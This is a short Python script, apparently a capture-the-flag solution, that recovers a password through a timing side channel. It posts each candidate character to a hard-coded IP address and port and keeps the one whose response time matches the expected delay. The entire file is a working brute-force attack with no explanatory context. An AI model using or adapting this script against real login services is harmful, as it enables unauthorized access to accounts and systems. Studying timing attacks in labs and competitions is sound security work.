import requests
from string import ascii_letters, digits

chars = list(ascii_letters + digits)
pwd = "kBySla0"
for i in range(4, 7):
    tmp_t = 0
    new_pwd = ""
    for j in range(len(chars)):
        pwd = pwd[:i] + chars[j] + pwd[i+1:]
        print(pwd)
        url = 'http://34.31.154.223:59770/'
        data = {'password': pwd}
        r = requests.post(url=url, data=data)
        print(r.elapsed.seconds)
        if r.elapsed.seconds == i + 1:
            new_pwd = pwd
            print("new: ", new_pwd)
            break
    pwd = new_pwd
    print("new: ", new_pwd)


